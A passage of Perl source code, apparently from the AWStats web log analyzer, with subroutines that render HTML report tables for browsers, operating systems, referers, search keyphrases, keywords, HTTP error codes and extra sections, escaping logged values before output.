                "<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_h\" height=\"5\" /><br />";
        }
        print "</td>";
        print "</tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Unknown Browser Detail frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowBrowserUnknown{
    my $NewLinkTarget = shift;
    print "$Center<a name=\"unknownbrowser\">&nbsp;</a><br />\n";
    my $title = "$Message[50]";
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=UNKNOWNREFERERBROWSER&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }
    &tab_head( "$title", 19, 0, 'unknownbrowser' );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>User agent ("
        . ( scalar keys %_unknownrefererbrowser_l )
        . ")</th><th>$Message[9]</th></tr>\n";
    my $total_l = 0;
    my $count = 0;
    &BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_unknownrefererbrowser_l,
        \%_unknownrefererbrowser_l );
    foreach my $key (@keylist) {
        my $useragent = XMLEncode( CleanXSS($key) );
        print
            "<tr><td class=\"aws\">$useragent</td><td nowrap=\"nowrap\">"
                . Format_Date( $_unknownrefererbrowser_l{$key}, 1 )
                . "</td></tr>\n";
        $total_l += 1;
        $count++;
    }
    my $rest_l = ( scalar keys %_unknownrefererbrowser_l ) - $total_l;
    if ( $rest_l > 0 ) {
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        print "<td>-</td>";
        print "</tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the OS Detail frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowOSDetail{
    # Show os versions
    print "$Center<a name=\"osversions\">&nbsp;</a><br />";
    my $title = "$Message[59]";
    &tab_head( "$title", 19, 0, 'osversions' );
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">$Message[58]</th>";
    print
        "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th><th bgcolor=\"#$color_p\" width=\"80\">$Message[15]</th>";
    print
        "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th>";
    print "</tr>\n";
    my $total_h = 0;
    my $total_p = 0;
    my $count = 0;
    &BuildKeyList( MinimumButNoZero( scalar keys %_os_h, 500 ),
        1, \%_os_h, \%_os_p );
    my %keysinkeylist = ();
    my $max_h = 1;
    my $max_p = 1;

    # Count total by family
    my %totalfamily_h = ();
    my %totalfamily_p = ();
    my $TotalFamily_h = 0;
    my $TotalFamily_p = 0;
    OSLOOP: foreach my $key (@keylist) {
        $total_h += $_os_h{$key};
        $total_p += $_os_p{$key};
        if ( $_os_h{$key} > $max_h ) { $max_h = $_os_h{$key}; }
        if ( $_os_p{$key} > $max_p ) { $max_p = $_os_p{$key}; }
        foreach my $family ( keys %OSFamily ) {
            if ( $key =~ /^$family/i ) {
                $totalfamily_h{$family} += $_os_h{$key};
                $totalfamily_p{$family} += $_os_p{$key};
                $TotalFamily_h          += $_os_h{$key};
                $TotalFamily_p          += $_os_p{$key};
                next OSLOOP;
            }
        }
    }

    # Write records grouped in a browser family
    foreach my $family ( keys %OSFamily ) {
        my $p_h = '&nbsp;';
        my $p_p = '&nbsp;';
        if ($total_h) {
            $p_h = int( $totalfamily_h{$family} / $total_h * 1000 ) / 10;
            $p_h = "$p_h %";
        }
        if ($total_p) {
            $p_p = int( $totalfamily_p{$family} / $total_p * 1000 ) / 10;
            $p_p = "$p_p %";
        }
        my $familyheadershown = 0;
        foreach my $key ( reverse sort keys %_os_h ) {
            if ( $key =~ /^$family(.*)/i ) {
                if ( !$familyheadershown ) {
                    my $family_name = '';
                    if ( $OSFamily{$family} ) {
                        $family_name = $OSFamily{$family};
                    }
                    print
                        "<tr bgcolor=\"#F6F6F6\"><td class=\"aws\" colspan=\"2\"><b>$family_name</b></td>";
                    print "<td><b>"
                        . Format_Number(int( $totalfamily_p{$family} ))
                        . "</b></td><td><b>$p_p</b></td>";
                    print "<td><b>"
                        . Format_Number(int( $totalfamily_h{$family} ))
                        . "</b></td><td><b>$p_h</b></td><td>&nbsp;</td>";
                    print "</tr>\n";
                    $familyheadershown = 1;
                }
                $keysinkeylist{$key} = 1;
                my $ver = $1;
                my $p_h = '&nbsp;';
                my $p_p = '&nbsp;';
                if ($total_h) {
                    $p_h = int( $_os_h{$key} / $total_h * 1000 ) / 10;
                    $p_h = "$p_h %";
                }
                if ($total_p) {
                    $p_p = int( $_os_p{$key} / $total_p * 1000 ) / 10;
                    $p_p = "$p_p %";
                }
                print "<tr>";
                print "<td"
                    . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                    . "><img src=\"$DirIcons\/os\/$key.png\""
                    . AltTitle("")
                    . " /></td>";

                print "<td class=\"aws\">$OSHashLib{$key}</td>";
                my $bredde_h = 0;
                my $bredde_p = 0;
                if ( $max_h > 0 ) {
                    $bredde_h =
                        int( $BarWidth * ( $_os_h{$key} || 0 ) / $max_h )
                            + 1;
                }
                if ( ( $bredde_h == 1 ) && $_os_h{$key} ) {
                    $bredde_h = 2;
                }
                if ( $max_p > 0 ) {
                    $bredde_p =
                        int( $BarWidth * ( $_os_p{$key} || 0 ) / $max_p )
                            + 1;
                }
                if ( ( $bredde_p == 1 ) && $_os_p{$key} ) {
                    $bredde_p = 2;
                }
                print "<td>".Format_Number($_os_p{$key})."</td><td>$p_p</td>";
                print "<td>".Format_Number($_os_h{$key})."</td><td>$p_h</td>";
                print "<td class=\"aws\">";

                # alt and title are not provided to reduce page size
                if ($ShowOSStats) {
                    print
                        "<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"5\" /><br />";
                    print
                        "<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_h\" height=\"5\" /><br />";
                }
                print "</td>";
                print "</tr>\n";
                $count++;
            }
        }
    }

    # Write other records
    my $familyheadershown = 0;
    foreach my $key (@keylist) {
        if ( $keysinkeylist{$key} ) { next; }
        if ( !$familyheadershown )  {
            my $p_h = '&nbsp;';
            my $p_p = '&nbsp;';
            if ($total_h) {
                $p_h =
                    int( ( $total_h - $TotalFamily_h ) / $total_h * 1000 ) /
                        10;
                $p_h = "$p_h %";
            }
            if ($total_p) {
                $p_p =
                    int( ( $total_p - $TotalFamily_p ) / $total_p * 1000 ) /
                        10;
                $p_p = "$p_p %";
            }
            print
                "<tr bgcolor=\"#F6F6F6\"><td class=\"aws\" colspan=\"2\"><b>$Message[2]</b></td>";
            print "<td><b>"
                . Format_Number(( $total_p - $TotalFamily_p ))
                . "</b></td><td><b>$p_p</b></td>";
            print "<td><b>"
                . Format_Number(( $total_h - $TotalFamily_h ))
                . "</b></td><td><b>$p_h</b></td><td>&nbsp;</td>";
            print "</tr>\n";
            $familyheadershown = 1;
        }
        my $p_h = '&nbsp;';
        my $p_p = '&nbsp;';
        if ($total_h) {
            $p_h = int( $_os_h{$key} / $total_h * 1000 ) / 10;
            $p_h = "$p_h %";
        }
        if ($total_p) {
            $p_p = int( $_os_p{$key} / $total_p * 1000 ) / 10;
            $p_p = "$p_p %";
        }
        print "<tr>";
        if ( $key eq 'Unknown' ) {
            print "<td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/browser\/unknown.png\""
                . AltTitle("")
                . " /></td><td class=\"aws\"><span style=\"color: #$color_other\">$Message[0]</span></td>";
        }
        else {
            my $keywithoutcumul = $key;
            $keywithoutcumul =~ s/cumul$//i;
            my $libos = $OSHashLib{$keywithoutcumul}
                || $keywithoutcumul;
            my $nameicon = $keywithoutcumul;
            $nameicon =~ s/[^\w]//g;
            print "<td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/os\/$nameicon.png\""
                . AltTitle("")
                . " /></td><td class=\"aws\">$libos</td>";
        }
        my $bredde_h = 0;
        my $bredde_p = 0;
        if ( $max_h > 0 ) {
            $bredde_h =
                int( $BarWidth * ( $_os_h{$key} || 0 ) / $max_h ) + 1;
        }
        if ( ( $bredde_h == 1 ) && $_os_h{$key} ) { $bredde_h = 2; }
        if ( $max_p > 0 ) {
            $bredde_p =
                int( $BarWidth * ( $_os_p{$key} || 0 ) / $max_p ) + 1;
        }
        if ( ( $bredde_p == 1 ) && $_os_p{$key} ) { $bredde_p = 2; }
        print "<td>".Format_Number($_os_p{$key})."</td><td>$p_p</td>";
        print "<td>".Format_Number($_os_h{$key})."</td><td>$p_h</td>";
        print "<td class=\"aws\">";

        # alt and title are not provided to reduce page size
        if ($ShowOSStats) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"5\" /><br />";
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_h\" height=\"5\" /><br />";
        }
        print "</td>";
        print "</tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Unknown OS Detail frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowOSUnknown{
    my $NewLinkTarget = shift;
    print "$Center<a name=\"unknownos\">&nbsp;</a><br />\n";
    my $title = "$Message[46]";
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=UNKNOWNREFERER&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }
    &tab_head( "$title", 19, 0, 'unknownos' );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>User agent ("
        . ( scalar keys %_unknownreferer_l )
        . ")</th><th>$Message[9]</th></tr>\n";
    my $total_l = 0;
    my $count = 0;
    &BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_unknownreferer_l,
        \%_unknownreferer_l );
    foreach my $key (@keylist) {
        my $useragent = XMLEncode( CleanXSS($key) );
        print "<tr><td class=\"aws\">$useragent</td>";
        print "<td nowrap=\"nowrap\">"
            . Format_Date( $_unknownreferer_l{$key}, 1 ) . "</td>";
        print "</tr>\n";
        $total_l += 1;
        $count++;
    }
    my $rest_l = ( scalar keys %_unknownreferer_l ) - $total_l;
    if ( $rest_l > 0 ) {
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        print "<td>-</td>";
        print "</tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Referers frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowReferers{
    my $NewLinkTarget = shift;
    print "$Center<a name=\"refererse\">&nbsp;</a><br />\n";
    my $title = "$Message[40]";
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=SEREFERRALS&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }
    &tab_head( $title, 19, 0, 'refererse' );
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>".Format_Number($TotalDifferentSearchEngines)." $Message[122]</th>";
    print
        "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th><th bgcolor=\"#$color_p\" width=\"80\">$Message[15]</th>";
    print
        "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th>";
    print "</tr>\n";
    my $total_s = 0;
    my $total_p = 0;
    my $total_h = 0;
    my $rest_p = 0;
    my $rest_h = 0;
    my $count = 0;
    &BuildKeyList(
        $MaxRowsInHTMLOutput,
        $MinHit{'Refer'},
        \%_se_referrals_h,
        (
            ( scalar keys %_se_referrals_p )
                ? \%_se_referrals_p
                : \%_se_referrals_h
        )
    );    # before 5.4 only hits were recorded

    foreach my $key (@keylist) {
        my $newreferer = $SearchEnginesHashLib{$key} || CleanXSS($key);
        my $p_p;
        my $p_h;
        if ($TotalSearchEnginesPages) {
            $p_p =
                int( $_se_referrals_p{$key} / $TotalSearchEnginesPages *
                    1000 ) / 10;
        }
        if ($TotalSearchEnginesHits) {
            $p_h =
                int( $_se_referrals_h{$key} / $TotalSearchEnginesHits *
                    1000 ) / 10;
        }
        print "<tr><td class=\"aws\">$newreferer</td>";
        print "<td>"
            . (
            $_se_referrals_p{$key} ? $_se_referrals_p{$key} : '&nbsp;' )
            . "</td>";
        print "<td>"
            . ( $_se_referrals_p{$key} ? "$p_p %" : '&nbsp;' ) . "</td>";
        print "<td>".Format_Number($_se_referrals_h{$key})."</td>";
        print "<td>$p_h %</td>";
        print "</tr>\n";
        $total_p += $_se_referrals_p{$key};
        $total_h += $_se_referrals_h{$key};
        $count++;
    }
    if ($Debug) {
        debug(
            "Total real / shown : $TotalSearchEnginesPages / $total_p - $TotalSearchEnginesHits / $total_h",
            2
        );
    }
    $rest_p = $TotalSearchEnginesPages - $total_p;
    $rest_h = $TotalSearchEnginesHits - $total_h;
    if ( $rest_p > 0 || $rest_h > 0 ) {
        my $p_p;
        my $p_h;
        if ($TotalSearchEnginesPages) {
            $p_p =
                int( $rest_p / $TotalSearchEnginesPages * 1000 ) / 10;
        }
        if ($TotalSearchEnginesHits) {
            $p_h = int( $rest_h / $TotalSearchEnginesHits * 1000 ) / 10;
        }
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        print "<td>" . ( $rest_p ? Format_Number($rest_p)  : '&nbsp;' ) . "</td>";
        print "<td>" . ( $rest_p ? "$p_p %" : '&nbsp;' ) . "</td>";
        print "<td>".Format_Number($rest_h)."</td>";
        print "<td>$p_h %</td>";
        print "</tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Referer Pages frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowRefererPages{
    my $NewLinkTarget = shift;
    print "$Center<a name=\"refererpages\">&nbsp;</a><br />\n";
    my $total_p = 0;
    my $total_h = 0;
    my $rest_p = 0;
    my $rest_h = 0;

    # Show filter form
    &HTMLShowFormFilter(
        "refererpagesfilter",
        $FilterIn{'refererpages'},
        $FilterEx{'refererpages'}
    );
    my $title = "$Message[41]";
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=PAGEREFS&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }
    my $cpt   = 0;
    $cpt = ( scalar keys %_pagesrefs_h );
    &tab_head( "$title", 19, 0, 'refererpages' );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>";
    if ( $FilterIn{'refererpages'} || $FilterEx{'refererpages'} ) {

        if ( $FilterIn{'refererpages'} ) {
            print "$Message[79] <b>$FilterIn{'refererpages'}</b>";
        }
        if ( $FilterIn{'refererpages'} && $FilterEx{'refererpages'} ) {
            print " - ";
        }
        if ( $FilterEx{'refererpages'} ) {
            print
                "Exclude $Message[79] <b>$FilterEx{'refererpages'}</b>";
        }
        if ( $FilterIn{'refererpages'} || $FilterEx{'refererpages'} ) {
            print ": ";
        }
        print "$cpt $Message[28]";

        #if ($MonthRequired ne 'all') {
        #	if ($HTMLOutput{'refererpages'}) { print "<br />$Message[102]: $TotalDifferentPages $Message[28]"; }
        #}
    }
    else { print "$Message[102]: ".Format_Number($cpt)." $Message[28]"; }
    print "</th>";
    print
        "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th><th bgcolor=\"#$color_p\" width=\"80\">$Message[15]</th>";
    print
        "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th>";
    print "</tr>\n";
    my $total_s = 0;
    my $count = 0;
    &BuildKeyList(
        $MaxRowsInHTMLOutput,
        $MinHit{'Refer'},
        \%_pagesrefs_h,
        (
            ( scalar keys %_pagesrefs_p )
                ? \%_pagesrefs_p
                : \%_pagesrefs_h
        )
    );

    foreach my $key (@keylist) {
        my $nompage = CleanXSS($key);
        if ( length($nompage) > $MaxLengthOfShownURL ) {
            $nompage =
                substr( $nompage, 0, $MaxLengthOfShownURL ) . "...";
        }
        my $p_p;
        my $p_h;
        if ($TotalRefererPages) {
            $p_p =
                int( $_pagesrefs_p{$key} / $TotalRefererPages * 1000 ) /
                    10;
        }
        if ($TotalRefererHits) {
            $p_h =
                int( $_pagesrefs_h{$key} / $TotalRefererHits * 1000 ) /
                    10;
        }
        print "<tr><td class=\"aws\">";
        &HTMLShowURLInfo($key);
        print "</td>";
        print "<td>"
            . ( $_pagesrefs_p{$key} ? Format_Number($_pagesrefs_p{$key}) : '&nbsp;' )
            . "</td><td>"
            . ( $_pagesrefs_p{$key} ? "$p_p %" : '&nbsp;' ) . "</td>";
        print "<td>"
            . ( $_pagesrefs_h{$key} ? Format_Number($_pagesrefs_h{$key}) : '&nbsp;' )
            . "</td><td>"
            . ( $_pagesrefs_h{$key} ? "$p_h %" : '&nbsp;' ) . "</td>";
        print "</tr>\n";
        $total_p += $_pagesrefs_p{$key};
        $total_h += $_pagesrefs_h{$key};
        $count++;
    }
    if ($Debug) {
        debug(
            "Total real / shown : $TotalRefererPages / $total_p - $TotalRefererHits / $total_h",
            2
        );
    }
    $rest_p = $TotalRefererPages - $total_p;
    $rest_h = $TotalRefererHits - $total_h;
    if ( $rest_p > 0 || $rest_h > 0 ) {
        my $p_p;
        my $p_h;
        if ($TotalRefererPages) {
            $p_p = int( $rest_p / $TotalRefererPages * 1000 ) / 10;
        }
        if ($TotalRefererHits) {
            $p_h = int( $rest_h / $TotalRefererHits * 1000 ) / 10;
        }
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        print "<td>" . ( $rest_p ? Format_Number($rest_p)  : '&nbsp;' ) . "</td>";
        print "<td>" . ( $rest_p ? "$p_p %" : '&nbsp;' ) . "</td>";
        print "<td>".Format_Number($rest_h)."</td>";
        print "<td>$p_h %</td>";
        print "</tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Key Phrases frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowKeyPhrases{
    my $NewLinkTarget = shift;
    print "$Center<a name=\"keyphrases\">&nbsp;</a><br />\n";
    my $title = "$Message[43]";
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=SEARCHWORDS&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }
    &tab_head( $title, 19, 0, 'keyphrases' );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\""
        . Tooltip(15)
        . "><th>".Format_Number($TotalDifferentKeyphrases)." $Message[103]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[14]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[15]</th></tr>\n";
    my $total_s = 0;
    my $count = 0;
    &BuildKeyList(
        $MaxRowsInHTMLOutput, $MinHit{'Keyphrase'},
        \%_keyphrases,        \%_keyphrases
    );
    foreach my $key (@keylist) {
        my $mot;
        # Convert coded keywords (utf8,...) to be correctly reported in HTML page.
        if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
            $mot = CleanXSS(
                DecodeKey_decodeutfkeys(
                    $key, $PageCode || 'iso-8859-1'
                )
            );
        }
        else { $mot = CleanXSS( DecodeEncodedString($key) ); }
        my $p;
        if ($TotalKeyphrases) {
            $p =
                int( $_keyphrases{$key} / $TotalKeyphrases * 1000 ) / 10;
        }
        print "<tr><td class=\"aws\">"
            . XMLEncode($mot)
            . "</td><td>$_keyphrases{$key}</td><td>$p %</td></tr>\n";
        $total_s += $_keyphrases{$key};
        $count++;
    }
    if ($Debug) {
        debug( "Total real / shown : $TotalKeyphrases / $total_s", 2 );
    }
    my $rest_s = $TotalKeyphrases - $total_s;
    if ( $rest_s > 0 ) {
        my $p;
        if ($TotalKeyphrases) {
            $p = int( $rest_s / $TotalKeyphrases * 1000 ) / 10;
        }
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[124]</span></td><td>".Format_Number($rest_s)."</td>";
        print "<td>$p %</td></tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Keywords frame or static page
# Parameters:   $NewLinkTarget
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowKeywords{
    my $NewLinkTarget = shift;
    print "$Center<a name=\"keywords\">&nbsp;</a><br />\n";
    my $title = "$Message[44]";
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=KEYWORDS&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }
    &tab_head( $title, 19, 0, 'keywords' );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\""
        . Tooltip(15)
        . "><th>".Format_Number($TotalDifferentKeywords)." $Message[13]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[14]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[15]</th></tr>\n";
    my $total_s = 0;
    my $count = 0;
    &BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'Keyword'},
        \%_keywords, \%_keywords );
    foreach my $key (@keylist) {
        my $mot;
        # Convert coded keywords (utf8,...) to be correctly reported in HTML page.
        if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
            $mot = CleanXSS(
                DecodeKey_decodeutfkeys(
                    $key, $PageCode || 'iso-8859-1'
                )
            );
        }
        else { $mot = CleanXSS( DecodeEncodedString($key) ); }
        my $p;
        if ($TotalKeywords) {
            $p = int( $_keywords{$key} / $TotalKeywords * 1000 ) / 10;
        }
        print "<tr><td class=\"aws\">"
            . XMLEncode($mot)
            . "</td><td>$_keywords{$key}</td><td>$p %</td></tr>\n";
        $total_s += $_keywords{$key};
        $count++;
    }
    if ($Debug) {
        debug( "Total real / shown : $TotalKeywords / $total_s", 2 );
    }
    my $rest_s = $TotalKeywords - $total_s;
    if ( $rest_s > 0 ) {
        my $p;
        if ($TotalKeywords) {
            $p = int( $rest_s / $TotalKeywords * 1000 ) / 10;
        }
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[30]</span></td><td>".Format_Number($rest_s)."</td>";
        print "<td>$p %</td></tr>\n";
    }
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the HTTP Error code frame or static page
# Parameters:   $code - the error code we're printing
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowErrorCodes{
    my $code = shift;
    my $title;
    my %customtitles = ( "404", "$Message[47]" );
    $title = $customtitles{$code} ? $customtitles{$code} :
        (join(' ', ( ($httpcodelib{$code} ? $httpcodelib{$code} :
            'Unknown error'), "urls (HTTP code " . $code . ")" )));
    print "$Center<a name=\"errors$code\">&nbsp;</a><br />\n";
    &tab_head( $title, 19, 0, "errors$code" );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>URL ("
        . Format_Number(( scalar keys %{$_sider_h{$code}} ))
        . ")</th><th bgcolor=\"#$color_h\">$Message[49]</th>";
    foreach (split(//, $ShowHTTPErrorsPageDetail)) {
        if ( $_ =~ /R/i ) {
            print "<th bgcolor=\"#$color_p\" width=\"80\">$Message[23]</th>";
        } elsif ( $_ =~ /H/i ) {
            print "<th bgcolor=\"#$color_p\" width=\"80\">$Message[81]</th>";
        }
    }
    print "</tr>\n";
    my $total_h = 0;
    my $count = 0;
    &BuildKeyList( $MaxRowsInHTMLOutput, 1, \%{$_sider_h{$code}},
        \%{$_sider_h{$code}} );
    foreach my $key (@keylist) {
        my $nompage = XMLEncode( CleanXSS($key) );

        #if (length($nompage)>$MaxLengthOfShownURL) { $nompage=substr($nompage,0,$MaxLengthOfShownURL)."..."; }
        my $referer = XMLEncode( CleanXSS( $_referer_h{$code}{$key} ) );
        my $host = XMLEncode( CleanXSS( $_err_host_h{$code}{$key} ) );
        print "<tr><td class=\"aws\">$nompage</td>";
        print "<td>".Format_Number($_sider_h{$code}{$key})."</td>";
        foreach (split(//, $ShowHTTPErrorsPageDetail)) {
            if ( $_ =~ /R/i ) {
                print "<td class=\"aws\">" . ( $referer ? "$referer" : "&nbsp;" ) . "</td>";
            } elsif ( $_ =~ /H/i ) {
                print "<td class=\"aws\">" . ( $host ? "$host" : "&nbsp;" ) . "</td>";
            }
        }
        print "</tr>\n";
        my $total_s += $_sider_h{$code}{$key};
        $count++;
    }

    # TODO Build TotalErrorHits
    #			if ($Debug) { debug("Total real / shown : $TotalErrorHits / $total_h",2); }
    #			$rest_h=$TotalErrorHits-$total_h;
    #			if ($rest_h > 0) {
    #				my $p;
    #				if ($TotalErrorHits) { $p=int($rest_h/$TotalErrorHits*1000)/10; }
    #				print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[30]</span></td>";
    #				print "<td>$rest_h</td>";
    #				print "<td>...</td>";
    #				print "</tr>\n";
    #			}
    &tab_end();
    &html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Loops through any defined extra sections and dumps the info to HTML
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowExtraSections{
    foreach my $extranum ( 1 .. @ExtraName - 1 ) {
        my $total_p = 0;
        my $total_h = 0;
        my $total_k = 0;

        if ( $HTMLOutput{"allextra$extranum"} ) {
            if ($Debug) { debug( "ExtraName$extranum", 2 ); }
            print "$Center<a name=\"extra$extranum\">&nbsp;</a><br />";
            my $title = $ExtraName[$extranum];
            &tab_head( "$title", 19, 0, "extra$extranum" );
            print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
            print "<th>" . $ExtraFirstColumnTitle[$extranum] . "</th>";

            if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
                print
                    "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th>";
            }
            if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
                print
                    "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th>";
            }
            if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
                print
                    "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th>";
            }
            if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
                print "<th width=\"120\">$Message[9]</th>";
            }
            print "</tr>\n";
            $total_p = $total_h = $total_k = 0;

            #$max_h=1; foreach (values %_login_h) { if ($_ > $max_h) { $max_h = $_; } }
            #$max_k=1; foreach (values %_login_k) { if ($_ > $max_k) { $max_k = $_; } }
            my $count = 0;
            if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
                &BuildKeyList(
                    $MaxRowsInHTMLOutput,
                    $MinHitExtra[$extranum],
                    \%{ '_section_' . $extranum . '_h' },
                    \%{ '_section_' . $extranum . '_p' }
                );
            }
            else {
                &BuildKeyList(
                    $MaxRowsInHTMLOutput,
                    $MinHitExtra[$extranum],
                    \%{ '_section_' . $extranum . '_h' },
                    \%{ '_section_' . $extranum . '_h' }
                );
            }
            my %keysinkeylist = ();
            foreach my $key (@keylist) {
                $keysinkeylist{$key} = 1;
                my $firstcol = CleanXSS( DecodeEncodedString($key) );
                $total_p += ${ '_section_' . $extranum . '_p' }{$key};
                $total_h += ${ '_section_' . $extranum . '_h' }{$key};
                $total_k += ${ '_section_' . $extranum . '_k' }{$key};
                print "<tr>";
                printf(
                    "<td class=\"aws\">$ExtraFirstColumnFormat[$extranum]</td>",
                    $firstcol, $firstcol, $firstcol, $firstcol, $firstcol );
                if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
                    print "<td>"
